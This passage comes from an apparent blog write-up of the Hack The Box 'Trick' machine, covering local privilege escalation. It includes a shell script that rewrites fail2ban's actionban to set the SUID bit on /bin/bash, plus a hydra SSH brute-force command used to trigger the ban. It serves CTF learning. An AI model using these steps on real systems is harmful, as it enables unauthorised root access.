+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh michael@trick.htb -i id_rsa
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611151616.webp">&lt;/figure>
+&lt;p>Checking sudo privileges&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo -l
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611151845.webp">&lt;/figure>
+&lt;p>Searched for writable file locations, but found nothing that stands out:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>find / -type f -writable 2&amp;gt;/dev/null | grep -vE &lt;span style="color:#b8bb26">&amp;#39;sys|proc|\/var\/www|\/home\/michael&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611152928.webp">&lt;/figure>
+&lt;p>Michael is part of the &lt;code>security&lt;/code> group&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611153032.webp">&lt;/figure>
+&lt;p>Checking if this group have write access anywhere:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>find / -type f -perm -g+w 2&amp;gt;/dev/null | grep -vE &lt;span style="color:#b8bb26">&amp;#39;sys|proc|\/var/\www|\/home\/michael&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611153829.webp">&lt;/figure>
+&lt;p>Still nothing much. Then I checked if I have write access to any directories:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>find / -type d -perm -g+w 2&amp;gt;/dev/null | grep -vE &lt;span style="color:#b8bb26">&amp;#39;sys|proc|\/var/\www|\/home\/michael&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611153608.webp">&lt;/figure>
+&lt;p>Turns out we have write access to &lt;code>/etc/fail2ban/action.d/&lt;/code>.&lt;/p>
+&lt;h3 id="abusing-fail2ban">Abusing &lt;code>fail2ban&lt;/code>&lt;/h3>
+&lt;p>Fail2ban is an IDS service that can be used for preventing bruteforce prevention. For example we can configure it to ban SSH clients after a specific amount of failed login attempts and for a specific amount of time.&lt;/p>
+&lt;p>To abuse this service for privilege escalation we have to overwrite the &lt;code>actionban&lt;/code> value inside the &lt;code>/etc/fail2ban/action.d/iptables-multiport.conf&lt;/code> file. When SSH bruteforce is detected &lt;code>fail2ban&lt;/code> will execute the command we gave in place of &lt;code>actionban&lt;/code>. Even though we don&amp;rsquo;t have write access to this file, we can replace the entire file with our own file or just delete it and create a new since we have write access to the entire directory.&lt;/p>
+&lt;p>Another thing to note is that there is a cronjob running that removes all the files in in the &lt;code>action.d&lt;/code> directory and restore with the original content. So we might need to create a simple script to automate the task.&lt;/p>
+&lt;p>This is the one I created:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#!/bin/sh
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>mv /etc/fail2ban/action.d/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf.bak
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cp /etc/fail2ban/action.d/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sed -i &lt;span style="color:#b8bb26">&amp;#39;s/actionban = .*/actionban = chmod u+s \/bin\/bash/g&amp;#39;&lt;/span> /etc/fail2ban/action.d/iptables-multiport.conf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo /etc/init.d/fail2ban restart
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Run the script and try to bruteforce SSH using hydra:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>hydra -I -u -l michael -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ssh://trick.htb -V
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After sometimes the command will be executed:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611165709.webp">&lt;/figure>
+&lt;p>Now we can read the root flag:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/trick/Pasted%20image%2020260611170106.webp">&lt;/figure>
+&lt;hr>
+&lt;h3 id="reference">Reference&lt;/h3>
+&lt;ul>
+&lt;li>&lt;a href="https://datatracker.ietf.org/doc/html/rfc5936#section-4">https://datatracker.ietf.org/doc/html/rfc5936#section-4&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it">https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://juggernaut-sec.com/fail2ban-lpe/">https://juggernaut-sec.com/fail2ban-lpe/&lt;/a>&lt;/li>
+&lt;/ul></content></item></channel></rss>
